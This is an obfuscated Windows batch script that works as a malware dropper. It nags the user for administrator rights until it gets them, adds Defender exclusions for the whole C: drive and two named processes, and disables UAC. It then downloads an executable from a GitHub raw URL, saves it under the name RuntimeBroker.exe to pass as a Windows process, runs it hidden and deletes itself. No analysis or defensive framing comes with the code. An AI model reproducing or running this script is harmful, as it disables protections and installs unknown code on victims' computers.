@echo off & setlocal enableDelayedExpansion
set "bHO=2>&1" & set "yHGKY=NET" & set "SYBG=SESSION" & set "fTo=>nul"
%yHGKY% %SYBG% %fTo% %bHO%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "tWHcH=baz" & set "XiXa=qux" & set "JAa=bar" & set "OEIL=foo" & rem OThvJ alDt gDQKgH
set "nKnE=powershell -ExecutionPolicy Bypass -Command"
set "Kqr=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "wlUVn='C:\' -ErrorAction SilentlyContinue"
!nKnE! "!Kqr! !wlUVn!" %fTo% %bHO%
set "epMLD=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!nKnE! "!epMLD!" %fTo% %bHO%
set "jBJqn=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!nKnE! "!jBJqn!" %fTo% %bHO%
set "FYpL=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "VeG=-Name 'EnableLUA' -Value 0"
!nKnE! "!FYpL! !VeG!" %fTo% %bHO%
set "UVLIu=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!nKnE! "!UVLIu!" %fTo% %bHO%
if !errorlevel! neq 0 (goto %a%)
set "mjT=timeout /t" & !mjT! 2 %fTo% %bHO%
set "cIG=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "EjD=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!nKnE! "!cIG! !EjD!" %fTo% %bHO%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!mjT! 1 %fTo% %bHO% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %fTo% %bHO%
del /f /q "%~f0" %fTo% %bHO%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %fTo% %bHO%
if !errorlevel! neq 0 (!mjT! 3 %fTo% %bHO% & goto %b%)
exit /b
